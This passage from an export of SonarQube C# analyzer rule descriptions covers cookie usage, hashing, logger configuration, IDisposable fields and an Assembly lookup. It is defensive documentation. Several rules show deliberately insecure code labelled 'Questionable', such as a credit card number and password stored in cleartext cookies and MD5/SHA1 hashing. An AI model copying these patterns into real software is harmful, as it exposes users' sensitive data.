  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",csharpsquid:S2255,cs,C#,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
// === .Net Framework ===

HttpCookie myCookie = new HttpCookie(""UserSettings"");
myCookie[""CreditCardNumber""] = ""1234 1234 1234 1234""; // Questionable; sensitive data stored
myCookie.Values[""password""] = ""5678""; // Questionable
myCookie.Value = ""mysecret""; // Questionable
...
Response.Cookies.Add(myCookie);

if (Request.Cookies[""myCookie""] != null &amp;&amp; Request.Cookies[""myCookie""][""myValue""] != null) // Questionable; reading a cookie's value
{
    string value = Request.Cookies[""myCookie""][""myValue""]; // Questionable
    value = Request.Cookies[""myCookie""].Values[""myValue""]; // Questionable
}

string value2 = Request.Cookies[""myCookie2""].Value; // Questionable


// === .Net Core ===

Response.Headers.Add(""Set-Cookie"", ...); // Questionable
Response.Cookies.Append(""mykey"", ""myValue""); // Questionable

Request.Cookies; // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",Using cookies is security-sensitive,[],MINOR,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2017-04-14T12:33:18+0200,"<p>Using <code>Type.Assembly</code> to get the current assembly is nearly free in terms of performance; it's a simple property access. On the other
hand, <code>Assembly.GetExecutingAssembly()</code> can take up to 30 times as long because it walks up the call stack to find the assembly.</p>
<p>Note that <code>Assembly.GetExecutingAssembly()</code> is different than <code>Type.Assembly</code> because it dynamically returns the assembly
that contains the startup object of the currently executed application. For example, if executed from an application it will return the application
assembly, but if executed from a unit test project it could return the unit test assembly. <code>Type.Assembly</code> always returns the assembly that
contains the specified type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Example
{
   public static void Main()
   {
      Assembly assem = Assembly.GetExecutingAssembly(); // Noncompliant
      Console.WriteLine(""Assembly name: {0}"", assem.FullName);
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Example
{
   public static void Main()
   {
      Assembly assem = typeof(Example).Assembly; // Here we use the type of the current class
      Console.WriteLine(""Assembly name: {0}"", assem.FullName);
   }
}
</pre>",csharpsquid:S3902,cs,C#,"<p>Using <code>Type.Assembly</code> to get the current assembly is nearly free in terms of performance; it's a simple property access. On the other
hand, <code>Assembly.GetExecutingAssembly()</code> can take up to 30 times as long because it walks up the call stack to find the assembly.</p>
<p>Note that <code>Assembly.GetExecutingAssembly()</code> is different than <code>Type.Assembly</code> because it dynamically returns the assembly
that contains the startup object of the currently executed application. For example, if executed from an application it will return the application
assembly, but if executed from a unit test project it could return the unit test assembly. <code>Type.Assembly</code> always returns the assembly that
contains the specified type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Example
{
   public static void Main()
   {
      Assembly assem = Assembly.GetExecutingAssembly(); // Noncompliant
      Console.WriteLine(""Assembly name: {0}"", assem.FullName);
   }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Example
{
   public static void Main()
   {
      Assembly assem = typeof(Example).Assembly; // Here we use the type of the current class
      Console.WriteLine(""Assembly name: {0}"", assem.FullName);
   }
}
</pre>","""Assembly.GetExecutingAssembly"" should not be called",[],MAJOR,['performance'],CODE_SMELL
2015-07-27T14:14:23+0200,"<p>An <code>IDisposable</code> object should be disposed (there are some rare exceptions where not disposing is fine, most notably <code>Task</code>).
If a class has an <code>IDisposable</code> field, there can be two situations:</p>
<p>- The class observes a field that it under the responsibility of another class. </p>
<p>- The class owns the field, and is therefore responsible for calling <code>Dispose</code> on it.</p>
<p>In the second case, the safest way for the class to ensure <code>Dispose</code> is called is to call it in its own <code>Dispose</code> function,
and therefore to be itself <code>IDisposable</code>. A class is considered to own an <code>IDisposable</code> field resource if it created the object
referenced by the field.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ResourceHolder   // Noncompliant; doesn't implement IDisposable
{
  private FileStream fs;  // This member is never Disposed
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open); // I create the FileStream, I'm owning it
  }
  public void CloseResource()
  {
    this.fs.Close();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ResourceHolder : IDisposable
{
&nbsp;&nbsp;private FileStream fs;
&nbsp;&nbsp;public void OpenResource(string path)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs = new FileStream(path, FileMode.Open); // I create the FileStream, I'm owning it
&nbsp;&nbsp;}
&nbsp;&nbsp;public void CloseResource()
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs.Close();
&nbsp;&nbsp;}

&nbsp;&nbsp;public void Dispose()
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs.Dispose();
&nbsp;&nbsp;}
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/459.html"">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>",csharpsquid:S2931,cs,C#,"<p>An <code>IDisposable</code> object should be disposed (there are some rare exceptions where not disposing is fine, most notably <code>Task</code>).
If a class has an <code>IDisposable</code> field, there can be two situations:</p>
<p>- The class observes a field that it under the responsibility of another class. </p>
<p>- The class owns the field, and is therefore responsible for calling <code>Dispose</code> on it.</p>
<p>In the second case, the safest way for the class to ensure <code>Dispose</code> is called is to call it in its own <code>Dispose</code> function,
and therefore to be itself <code>IDisposable</code>. A class is considered to own an <code>IDisposable</code> field resource if it created the object
referenced by the field.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ResourceHolder   // Noncompliant; doesn't implement IDisposable
{
  private FileStream fs;  // This member is never Disposed
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open); // I create the FileStream, I'm owning it
  }
  public void CloseResource()
  {
    this.fs.Close();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ResourceHolder : IDisposable
{
&nbsp;&nbsp;private FileStream fs;
&nbsp;&nbsp;public void OpenResource(string path)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs = new FileStream(path, FileMode.Open); // I create the FileStream, I'm owning it
&nbsp;&nbsp;}
&nbsp;&nbsp;public void CloseResource()
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs.Close();
&nbsp;&nbsp;}

&nbsp;&nbsp;public void Dispose()
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;this.fs.Dispose();
&nbsp;&nbsp;}
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/459.html"">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>","Classes with ""IDisposable"" members should implement ""IDisposable""",[],BLOCKER,"['cwe', 'denial-of-service']",BUG
2018-11-29T11:10:36+0100,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
using System.Security.Cryptography;

void ComputeHash()
{
    // Review all instantiations of classes that inherit from HashAlgorithm, for example:
    HashAlgorithm hashAlgo = HashAlgorithm.Create(); // Questionable
    HashAlgorithm hashAlgo2 = HashAlgorithm.Create(""SHA1""); // Questionable
    SHA1 sha = new SHA1CryptoServiceProvider(); // Questionable
    MD5 md5 = new MD5CryptoServiceProvider(); // Questionable
    // ...
}

class MyHashAlgorithm : HashAlgorithm // Questionable
{
    // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",csharpsquid:S4790,cs,C#,"<p>Hashing data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9233"">CVE-2018-9233</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5097"">CVE-2013-5097</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1051"">CVE-2007-1051</a> </li>
</ul>
<p>Cryptographic hash functions are used to uniquely identify information without storing their original form. When not done properly, an attacker can
steal the original information by guessing it (ex: with a <a href=""https://en.wikipedia.org/wiki/Rainbow_table"">rainbow table</a>), or replace the
original data with another one having the same hash.</p>
<p>This rule flags code that initiates hashing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the hashed value is used in a security context. </li>
  <li> the hashing algorithm you are using is known to have vulnerabilities. </li>
  <li> <a href=""https://en.wikipedia.org/wiki/Salt_(cryptography)"">salts</a> are not automatically generated and applied by the hashing function.
  </li>
  <li> any generated salts are cryptographically weak or not credential-specific. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> for security related purposes, use only hashing algorithms which are <a
  href=""https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet"">currently known to be strong</a>. Avoid using algorithms like MD5 and SHA1
  completely in security contexts. </li>
  <li> do not define your own hashing- or salt algorithms as they will most probably have flaws. </li>
  <li> do not use algorithms that compute too quickly, like SHA256, as it must remain beyond modern hardware capabilities to perform brute force and
  dictionary based attacks. </li>
  <li> use a hashing algorithm that generate its own salts as part of the hashing. If you generate your own salts, make sure that a cryptographically
  strong salt algorithm is used, that generated salts are credential-specific, and finally, that the salt is applied correctly before the hashing.
  </li>
  <li> save both the salt and the hashed value in the relevant database record; during future validation operations, the salt and hash can then be
  retrieved from the database. The hash is recalculated with the stored salt and the value being validated, and the result compared to the stored
  hash. </li>
  <li> the strength of hashing algorithms often decreases over time as hardware capabilities increase. Check regularly that the algorithms you are
  using are still considered secure. If needed, rehash your data using a stronger algorithm. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
using System.Security.Cryptography;

void ComputeHash()
{
    // Review all instantiations of classes that inherit from HashAlgorithm, for example:
    HashAlgorithm hashAlgo = HashAlgorithm.Create(); // Questionable
    HashAlgorithm hashAlgo2 = HashAlgorithm.Create(""SHA1""); // Questionable
    SHA1 sha = new SHA1CryptoServiceProvider(); // Questionable
    MD5 md5 = new MD5CryptoServiceProvider(); // Questionable
    // ...
}

class MyHashAlgorithm : HashAlgorithm // Questionable
{
    // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/916.html"">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/759.html"">MITRE, CWE-759</a> - Use of a One-Way Hash without a Salt </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/760.html"">MITRE, CWE-760</a> - Use of a One-Way Hash with a Predictable Salt </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Hashing data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285"">CVE-2018-0285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127"">CVE-2000-1127</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113"">CVE-2017-15113</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742"">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn't have its loggers in ""debug"" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<p>See</p>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/532.html"">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p><strong>.Net Core</strong>: configure programmatically</p>
<pre>
using System;
using System.Collections;
using System.Collections.Generic;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Microsoft.AspNetCore;

namespace MvcApp
{
    public class ProgramLogging
    {
        public static IWebHostBuilder CreateWebHostBuilder(string[] args) =&gt;
            WebHost.CreateDefaultBuilder(args)
                .ConfigureLogging((hostingContext, logging) =&gt; // Questionable
                {
                    // ...
                })
                .UseStartup&lt;StartupLogging&gt;();
    }

    public class StartupLogging
    {
        public void ConfigureServices(IServiceCollection services)
        {
            services.AddLogging(logging =&gt; // Questionable
            {
                // ...
            });
        }

        public void Configure(IApplicationBuilder app, IHostingEnvironment env, ILoggerFactory loggerFactory)
        {
            IConfiguration config = null;
            LogLevel level = LogLevel.Critical;
            Boolean includeScopes = false;
            Func&lt;string,Microsoft.Extensions.Logging.LogLevel,bool&gt; filter = null;
            Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings consoleSettings = null;
            Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings azureSettings = null;
            Microsoft.Extensions.Logging.EventLog.EventLogSettings eventLogSettings = null;

            // An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.
            loggerFactory.AddAzureWebAppDiagnostics(); // Questionable
            loggerFactory.AddAzureWebAppDiagnostics(azureSettings); // Questionable
            loggerFactory.AddConsole(); // Questionable
            loggerFactory.AddConsole(level); // Questionable
            loggerFactory.AddConsole(level, includeScopes); // Questionable
            loggerFactory.AddConsole(filter); // Questionable
            loggerFactory.AddConsole(filter, includeScopes); // Questionable
            loggerFactory.AddConsole(config); // Questionable
            loggerFactory.AddConsole(consoleSettings); // Questionable
            loggerFactory.AddDebug(); // Questionable
            loggerFactory.AddDebug(level); // Questionable
            loggerFactory.AddDebug(filter); // Questionable
            loggerFactory.AddEventLog(); // Questionable
            loggerFactory.AddEventLog(eventLogSettings); // Questionable
            loggerFactory.AddEventLog(level); // Questionable
            loggerFactory.AddEventSourceLogger(); // Questionable

            IEnumerable&lt;ILoggerProvider&gt; providers = null;
            LoggerFilterOptions filterOptions1 = null;
            IOptionsMonitor&lt;LoggerFilterOptions&gt; filterOptions2 = null;

            LoggerFactory factory = new LoggerFactory(); // Questionable
            new LoggerFactory(providers); // Questionable
            new LoggerFactory(providers, filterOptions1); // Questionable
            new LoggerFactory(providers, filterOptions2); // Questionable
        }
    }
}
</pre>
<p><strong>Log4Net</strong></p>
<pre>
using System;
using System.IO;
using System.Xml;
using log4net.Appender;
using log4net.Config;
using log4net.Repository;

namespace Logging
{
    class Log4netLogging
    {
        void Foo(ILoggerRepository repository, XmlElement element, FileInfo configFile, Uri configUri, Stream configStream,
        IAppender appender, params IAppender[] appenders) {
            log4net.Config.XmlConfigurator.Configure(repository); // Questionable
            log4net.Config.XmlConfigurator.Configure(repository, element); // Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configFile); // Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configUri); // Questionable
            log4net.Config.XmlConfigurator.Configure(repository, configStream); // Questionable
            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile); // Questionable

            log4net.Config.DOMConfigurator.Configure(); // Questionable
            log4net.Config.DOMConfigurator.Configure(repository); // Questionable
            log4net.Config.DOMConfigurator.Configure(element); // Questionable
            log4net.Config.DOMConfigurator.Configure(repository, element); // Questionable
            log4net.Config.DOMConfigurator.Configure(configFile); // Questionable
            log4net.Config.DOMConfigurator.Configure(repository, configFile); // Questionable
            log4net.Config.DOMConfigurator.Configure(configStream); // Questionable
            log4net.Config.DOMConfigurator.Configure(repository, configStream); // Questionable
            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile); // Questionable
            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile); // Questionable

            log4net.Config.BasicConfigurator.Configure(); // Questionable
            log4net.Config.BasicConfigurator.Configure(appender); // Questionable
            log4net.Config.BasicConfigurator.Configure(appenders); // Questionable
            log4net.Config.BasicConfigurator.Configure(repository); // Questionable
            log4net.Config.BasicConfigurator.Configure(repository, appender); // Questionable
            log4net.Config.BasicConfigurator.Configure(repository, appenders); // Questionable
        }
    }
}
</pre>
<p><strong>NLog</strong>: configure programmatically</p>
<pre>
namespace Logging
{
    class NLogLogging
    {
        void Foo(NLog.Config.LoggingConfiguration config) {
            NLog.LogManager.Configuration = config; // Questionable, this changes the logging configuration.
        }
    }
}
</pre>
<p><strong>Serilog</strong></p>
<pre>
namespace Logging
{
    class SerilogLogging
    {
        void Foo() {
            new Serilog.LoggerConfiguration(); // Questionable
        }
    }
}
</pre>",csharpsquid:S4792,cs,C#,"<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285"">CVE-2018-0285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127"">CVE-2000-1127</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113"">CVE-2017-15113</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742"">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn't have its loggers in ""debug"" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user
  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<p>See</p>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/532.html"">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Questionable Code Example</h2>
<p><strong>.Net Core</strong>: configure programmatically</p>
<pre>
using System;
using System.Collections;
using System.Collections.Generic;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;
using Microsoft.AspNetCore;

namespace MvcApp
{
    public class ProgramLogging
    {
        public static IWebHostBuilder CreateWebHostBuilder(string[] args) =&gt;
            WebHost.CreateDefaultBuilder(args)
                .ConfigureLogging((hostingContext, logging) =&gt; // Questionable
                {
                    // ...
                })
                .UseStartup&lt;StartupLogging&gt;();
    }

    public class StartupLogging
    {
        public void ConfigureServices(IServiceCollection services)
        {
            services.AddLogging(logging =&gt; // Questionable
            {
                // ...
            });
        }

        public void Configure(IApplicationBuilder app, IHostingEnvironment env, ILoggerFactory loggerFactory)
        {
            IConfiguration config = null;
            LogLevel level = LogLevel.Critical;
            Boolean includeScopes = false;
            Func&lt;string,Microsoft.Extensions.Logging.LogLevel,bool&gt; filter = null;
